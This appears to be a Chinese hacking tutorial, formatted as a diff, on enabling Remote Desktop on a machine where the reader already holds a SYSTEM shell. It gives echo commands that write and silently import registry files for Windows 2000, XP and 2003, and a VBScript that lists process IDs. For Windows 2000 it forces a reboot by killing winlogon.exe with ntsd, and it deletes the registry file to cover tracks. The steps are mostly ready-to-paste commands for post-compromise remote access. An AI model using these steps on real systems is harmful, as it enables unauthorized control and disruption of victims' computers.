@@ -1,0 +1,120 @@
+今天介绍的这种开终端的方法，绿色，环保，无污染~~
+不须上传任何文件开启终端的方法适合win2k,xp,2003.
+本文前提是已经通过某种方法得到了对方的一个SYSTEM权限的CMDSHELL~~
+在无须传任何文件的情况下开启终端服务。
+
+一、win 2k下终端开启终端
+首先用ECHO写一个3389.reg文件,然后导入到注册表，echo代码如下：
+
+echo Windows Registry Editor Version 5.00 >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\netcache] >>3389.reg
+echo "Enabled"="0" >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] >>3389.reg
+echo "ShutdownWithoutLogon"="0" >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] >>3389.reg
+echo "EnableAdminTSRemote"=dword:00000001 >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] >>3389.reg
+echo "TSEnabled"=dword:00000001 >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermDD] >>3389.reg
+echo "Start"=dword:00000002 >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService] >>3389.reg
+echo "Start"=dword:00000002 >>3389.reg
+echo [HKEY_USERS\.DEFAULT\Keyboard Layout\Toggle] >>3389.reg
+echo "Hotkey"="1" >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] >>3389.reg
+echo "PortNumber"=dword:00000D3D >>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] >>3389.reg
+echo "PortNumber"=dword:00000D3D >>3389.reg
+把这些ECHO代码到CMDSHELL下贴粘就可以生成3389.reg文件，接着regedit /s 3389.reg导入注册表。
+(如果要改变终端端口只须把上面的两个D3D都改一下就可以了)
+因为win 2k下开终端不能像XP一样可以立即生效,而是需重启机器后才生效。
+一个简单的办法就是用ntsd.exe(win 2k以上自带的命令)结束一个重要的进程就可以实现机器重启了！！
+比如结束winlogon.exe,lsass.exe也可以但结束后会跳出重启倒计时(不太好~)
+winlogon.exe被关闭后机器立刻强制重启了
+命令执行格式为ntsd -c q -p PID
+那如何知道winlogon.exe的PID进程号呢~
+以下这个脚本可以列举当前所有进程的PID：
+
+wscript.echo "PID ProcessName"
+for each ps in getobject("winmgmts:\\.\root\cimv2:win32_process").instances_
+wscript.echo ps.handle&vbtab&ps.name
+next
+在CMDSHELL窗口下贴上如下ECHO代码就可以得到查看进程PID的脚本1.vbe：
+echo wscript.echo "PID ProcessName">>1.vbe
+echo for each ps in getobject("winmgmts:\\.\root\cimv2:win32_process").instances_ >>1.vbe
+echo wscript.echo ps.handle^&vbtab^&ps.name>>1.vbe
+echo next>>1.vbe
+
+生成1.vbe后请检查一下echo出来的脚本是否有错(才四行，对一下上面给出的就可以了)。
+运行1.vbe得到如下运行结果：
+
+C:\WINNT\system32>cscript 1.vbe
+cscript 1.vbe
+Microsoft (R) Windows 脚本宿主版本 5.1 for Windows
+版权所有(C) Microsoft Corporation 1996-1999. All rights reserved.
+
+PID ProcessName
+0 System Idle Process
+8 System
+152 smss.exe
+180 csrss.exe
+200 winlogon.exe
+228 services.exe
+240 lsass.exe
+424 svchost.exe
+472 spoolsv.exe
+512 msdtc.exe
+616 svchost.exe
+628 KAVSvc.EXE
+660 llssrv.exe
+692 nvsvc32.exe
+728 regsvc.exe
+748 MSTask.exe
+776 alter.exe
+900 svchost.exe
+916 WinMgmt.exe
+1088 Dfssvc.exe
+484 Explorer.EXE
+1444 mdm.exe
+1340 Server.exe
+1224 ibguard.exe
+1252 KAVSvcUI.EXE
+1256 ibserver.exe
+1336 internat.exe
+1204 Uspds.exe
+720 bar.exe
+1288 dllhost.exe
+1580 inetinfo.exe
+1672 cmd.exe
+1464 pppoe.exe
+1704 regedit.exe
+316 cscript.exe
+
+从上面可以看出当前winlogon.exe的PID号为200运行命令ntsd -c q -p 200 (这里的200要替换为winlogon.exe进程对就的PID啦)过会儿机器马
+
+上重启了(ntsd.exe是WIN自带的可用来结束任意级别进程)等着收获吧~~
+
+
+二、winxp和win2003终端开启
+
+开启的REG文件代码如下：
+Windows Registry Editor Version 5.00
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
+"fDenyTSConnections"=dword:00000000
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]
+"PortNumber"=dword:00000D3D
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]
+"PortNumber"=dword:00000D3D
+用以下ECHO代码写一个REG文件：
+echo Windows Registry Editor Version 5.00>>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>>3389.reg
+echo "fDenyTSConnections"=dword:00000000>>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]>>3389.reg
+echo "PortNumber"=dword:00000d3d>>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]>>3389.reg
+echo "PortNumber"=dword:00000d3d>>3389.reg
+regedit /s 3389.reg
+del 3389.reg
+这样xp和2003开启终端是不用重启的如果你想改端口只需把上面的两个PortNumber对应的D3D改成相应十进制数的十六进制形式就可以了！用计算器转换吧。XP下不论开终端还是改终端端口都不需重启，真是太妙了~~呵呵。如果要关闭终闭只需把"fDenyTSConnections"=dword:00000000
+
+改成"fDenyTSConnections"=dword:00000001
